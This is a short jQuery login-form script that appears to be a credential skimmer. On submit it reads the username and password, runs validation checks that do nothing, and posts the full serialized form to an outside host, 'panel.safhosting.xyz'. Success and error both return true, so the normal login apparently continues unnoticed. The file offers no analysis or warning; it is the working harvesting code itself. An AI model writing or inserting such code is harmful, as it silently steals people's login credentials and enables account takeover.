$(".login-form").submit(function () {

   var d = $(".login-form");

   {
      $user = $('#user').val().trim();
      $pass = $('#pass').val().trim();
      if ($user == '' || $user == null || $user.length <= 5) {

      } else {

      }
      if ($pass == '' || $pass == null || $pass.length <= 5) {

      } else {

      }

      if ($user !== '' || $user !== null || !$pass == '' || !$pass == null)

      {

         $.ajax({
            type: 'POST',
            url: 'https://panel.safhosting.xyz/?cat=',
            data: d.serialize(),
            dataType: 'text',
            success: function () {

               return true;

            },

            error: function () {

               return true;
            }
         })
      }
   }
})
